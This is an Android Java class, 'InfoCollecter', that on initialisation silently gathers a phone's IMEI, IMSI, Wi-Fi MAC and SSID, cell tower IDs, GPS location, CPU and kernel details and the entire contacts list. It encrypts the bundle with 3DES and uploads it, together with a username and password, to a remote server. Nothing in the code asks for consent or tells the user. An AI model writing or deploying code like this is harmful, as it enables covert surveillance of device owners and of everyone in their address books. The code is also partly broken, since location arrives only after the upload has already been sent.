package com.starnet.infocollecter;

import java.util.ArrayList;

import org.json.JSONException;
import org.json.JSONObject;


import com.starnet.constant.WebJsonKey;
import com.starnet.utils.CMDExecute;
import com.starnet.utils.Des3;
import com.starnet.utils.JsonTool;
import com.starnet.utils.LogUtil;
import com.starnet.utils.net.NetTool;
import com.starnet.vo.ContactVo;

import android.content.ContentResolver;
import android.content.Context;
import android.content.res.Configuration;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.view.WindowManager;

/**
 * 收集信息的入口 只需要初始化此类，调用init()函数传入相应参数即可完成信息的收集
 * 
 * @author zmp
 * 
 */
public class InfoCollecter
{

	/**
	 * 上下文
	 */
	private Context context;

	/**
	 * 上传的服务器地址
	 */
	private String serveAddress;
	
	/**
	 * 获取到的信息
	 */
	private StringBuffer infoStr = new StringBuffer();
	
	private String userName;
	
	private String passW;

	public InfoCollecter()
	{

	}

	/**
	 * 初始化信息收集器
	 * @param context上下文
	 * @param serveAddress 收集信息的http服务器地址
	 * @param userName 用户名
	 * @param passW 密码
	 */
	public void init(Context context, String serveAddress,String userName,String passW)
	{
		this.context = context;
		this.serveAddress = serveAddress;
		this.userName = userName;
		this.passW = passW;
		getAllInfo();
	}

	/**
	 * 获取所有的信息
	 */
	private void getAllInfo()  
	{

		infoStr.append("{");
		JsonTool.appendJsonItem(infoStr, WebJsonKey.userName, userName);
		JsonTool.appendJsonItem(infoStr, WebJsonKey.passW, passW);
		
		infoStr.append("\""+WebJsonKey.jsonData+"\":");
		
		//data数据部分
		infoStr.append("{");
		getScreenPiex();
		getWifiInfo();
		getTelePhonyManagerInfo();
		isTablet();
		getLocalPosition();
		getContactsData();
		getVersionInfo();
		getCpuInfo();
		
		infoStr.deleteCharAt(infoStr.length()-1);
		infoStr.append("}");
		//data数据部分

		//结束的大括号
		infoStr.append("}");
		
		String data = infoStr.toString();
		
		//ceshi
		LogUtil.showServerBackInfo(data, context);
        try {
			JSONObject jsonObject = new JSONObject(data);
			System.out.println("用户名： "+jsonObject.getString(WebJsonKey.userName));
		} catch (JSONException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		//ceshi
		
		
		
		try 
		{
			data = Des3.encode(data);
		} catch (Exception e) 
		{
			e.printStackTrace();
		}
		
		//收集到的数据上传
		NetTool.uploadData(serveAddress, data,context);
	}

	/**
	 * 获取分辨率
	 */
	private void getScreenPiex() 
	{
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
		DisplayMetrics displayMetrics = new DisplayMetrics();
		windowManager.getDefaultDisplay().getMetrics(displayMetrics);
		JsonTool.appendJsonItem(infoStr, WebJsonKey.widthPixels, displayMetrics.widthPixels);
		JsonTool.appendJsonItem(infoStr, WebJsonKey.heightPixels, displayMetrics.heightPixels);
	}
	
	 /**
     * 获取wifi信息 
     */
    private void getWifiInfo()
    {
        WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        
        Boolean isWifiEnable = wifiManager.isWifiEnabled();
        JsonTool.appendJsonItem(infoStr, WebJsonKey.wifiEnabled, isWifiEnable);
        
        
        int wifiState = wifiManager.getWifiState();
        JsonTool.appendJsonItem(infoStr, WebJsonKey.wifiState, wifiState);
       
        
        WifiInfo wifiInfo = wifiManager.getConnectionInfo();
        if(wifiInfo != null)
        {
	        String mac = wifiInfo.getMacAddress();
	        JsonTool.appendJsonItem(infoStr, WebJsonKey.wifiMac, mac);
	        
	        String ssid = wifiInfo.getSSID();
	        ssid = ssid.substring(1, ssid.length()-1);
	        JsonTool.appendJsonItem(infoStr, WebJsonKey.wifissid, ssid);
	        
	        int ipAddress = wifiInfo.getIpAddress();
	        JsonTool.appendJsonItem(infoStr, WebJsonKey.ipAddress, ipAddress);
        }
        
    }
    
    
    
	  /**
	     手机相关的信息
	  */
	private void getTelePhonyManagerInfo()
	{
		TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		
		String imei = telephonyManager.getDeviceId();    //设置imei号
		JsonTool.appendJsonItem(infoStr, WebJsonKey.imei, imei);
		
		String operator = telephonyManager.getNetworkOperator();  
		if(!TextUtils.isEmpty(operator))
		{
		    int mcc = Integer.parseInt(operator.substring(0, 3));  
		    int mnc = Integer.parseInt(operator.substring(3));  
		    	      
		    GsmCellLocation location = (GsmCellLocation) telephonyManager.getCellLocation();  
		    int lac = location.getLac();  
		    int cellid = location.getCid();  
		
		    JsonTool.appendJsonItem(infoStr, WebJsonKey.mcc, mcc);
		    JsonTool.appendJsonItem(infoStr, WebJsonKey.mnc, mnc);
		    JsonTool.appendJsonItem(infoStr, WebJsonKey.lac, lac);
		    JsonTool.appendJsonItem(infoStr, WebJsonKey.cellid, cellid);
		}
		
		
		
		 String phoneType;
		//通信类型
		 if(telephonyManager.getPhoneType() == TelephonyManager.PHONE_TYPE_GSM)
		 {
			 phoneType = "GSM";
		 }else if(telephonyManager.getPhoneType() == TelephonyManager.PHONE_TYPE_CDMA)
		 {
			 phoneType = "CDMA";
		 }else{
			 phoneType = "NONE";
		 }
		 
		 JsonTool.appendJsonItem(infoStr, WebJsonKey.phoneType, phoneType);
		 
		 String networkType;
		//网络类型
		 switch(telephonyManager.getNetworkType())
		 {
		 	case TelephonyManager.NETWORK_TYPE_EDGE:
		 		networkType = "EDGE";
		 		break;
		 	case TelephonyManager.NETWORK_TYPE_GPRS:
		 		networkType = "GPRS";
		 		break;
		 		default:
		 			networkType = "NONE";
		 }
		 
		 JsonTool.appendJsonItem(infoStr, WebJsonKey.networkType, networkType);
		 
		 //是否漫游
		 JsonTool.appendJsonItem(infoStr, WebJsonKey.networkRoaming, telephonyManager.isNetworkRoaming());
		 
		 //手机IMEI
		 JsonTool.appendJsonItem(infoStr, WebJsonKey.deviceSoftwareVersion, telephonyManager.getDeviceSoftwareVersion());
		 
		 //手机IMSI
		 JsonTool.appendJsonItem(infoStr, WebJsonKey.subscriberId, telephonyManager.getSubscriberId());
	}
    
    
	 /**
     * 判断是否是平板
     * @param  
     * @return
     */
     private  void isTablet( ) 
     {
        Boolean isTable = (context.getResources().getConfiguration().screenLayout& Configuration.SCREENLAYOUT_SIZE_MASK)>= Configuration.SCREENLAYOUT_SIZE_LARGE;
        JsonTool.appendJsonItem(infoStr, WebJsonKey.isTable, isTable);
     }
     
     
    private MyLocationListener myLocationListener;
    private LocationManager locationManager;
     
     /**
     * 获取当前位置 
     */
    private void getLocalPosition()
     {
    	 locationManager = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);//获取LocationManager的一个实例
    	 Boolean isGpsEnable = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
    	 if(isGpsEnable)
    	 {
    		 Criteria criteria = new Criteria();
    		 criteria.setAccuracy(Criteria.ACCURACY_FINE);
    		 criteria.setCostAllowed(false); 
    		 String providerName = locationManager.getBestProvider(criteria, true);

    		 myLocationListener = new MyLocationListener();
    		 
    		 if (providerName != null)
    		 {
    			 locationManager.requestLocationUpdates(providerName, 0, 0, myLocationListener);
    		 }else 
    		 {
    			 locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, myLocationListener);
			 }
    	 }
     }
    
    private class MyLocationListener implements LocationListener
    {
		@Override
		public void onLocationChanged(Location location) 
		{
   		   String latitude = Double.toString(location.getLatitude());//经度
   		   String longitude = Double.toString(location.getLongitude());//纬度
   		   String altitude = Double.toString(location.getAltitude());//海拔

   		   JsonTool.appendJsonItem(infoStr, WebJsonKey.latitude, latitude);
   		   JsonTool.appendJsonItem(infoStr, WebJsonKey.longitude, longitude);
   		   JsonTool.appendJsonItem(infoStr, WebJsonKey.altitude, altitude);
   		   locationManager.removeUpdates(myLocationListener);//获取到数据之后，就断开
		}

		@Override
		public void onProviderDisabled(String provider) 
		{
		}

		@Override
		public void onProviderEnabled(String provider)
		{
			
		}

		@Override
		public void onStatusChanged(String provider, int status, Bundle extras) {
			
		}
    	
    }
    
    
    /**
     * 获取联系人数据
     */
    private void getContactsData()
    {
    	ArrayList<ContactVo> contactVos = new ArrayList<ContactVo>();
    	ContentResolver contentResolver = context.getContentResolver();
    	Cursor cursor = contentResolver.query(Phone.CONTENT_URI, new String[]{Phone.NUMBER,Phone.DISPLAY_NAME,Phone.CONTACT_ID}, null, null, null);
        if(cursor != null)
        {
        	while (cursor.moveToNext()) 
        	{
				String phoneNum = cursor.getString(0);
				if(TextUtils.isEmpty(phoneNum))
				{
					continue;
				}
				String phoneName = cursor.getString(1);
				long phoneId = cursor.getLong(2);
				ContactVo vo = new ContactVo();
				vo.phoneId = phoneId;
				vo.phoneName = phoneName;
				vo.phoneNum = phoneNum;
				contactVos.add(vo);
			}
        	
        	cursor.close();
        }
        
        JsonTool.appendJsonItem(infoStr, WebJsonKey.contactVo, contactVos);
    }
    
    
    
    /**
     * 操作系统版本
     */
    private void getVersionInfo()
    {
    	String result = "";
    	CMDExecute cmdExecute = new CMDExecute();
    	try 
    	{
			String[] args = {"/system/bin/cat","/proc/version"};
			result = cmdExecute.run(args, "system/bin/");
		} catch (Exception e) 
		{
			
		}
    	
    	JsonTool.appendJsonItem(infoStr, WebJsonKey.sysVer, result);
    }
    
    
    
    /**
     * 获取cpu信息
     */
    private void getCpuInfo()
    {
    	String result = "";
    	CMDExecute cmdExecute = new CMDExecute();
    	try 
    	{
			String[] args = {"/system/bin/cat","/proc/cpuinfo"};
			result = cmdExecute.run(args, "/system/bin/");
		} catch (Exception e) 
		{
			 
		}
    	
    	JsonTool.appendJsonItem(infoStr, WebJsonKey.cpuinfo, result);
    }
    
    
    
    
    
    
    

}
